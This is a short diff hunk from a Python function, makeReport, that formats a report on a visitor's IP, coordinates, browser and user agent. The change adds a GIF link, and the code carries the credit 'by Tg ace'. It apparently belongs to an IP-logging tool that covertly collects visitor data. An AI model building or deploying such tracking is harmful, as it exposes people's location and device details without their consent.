@@ -168,6 +168,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Browser:** `{browser}`
 > by Tg ace
 **User Agent:**
+> https://tenor.com/view/good-morning-gif-27344488
 ```
 {useragent}
 ```""",
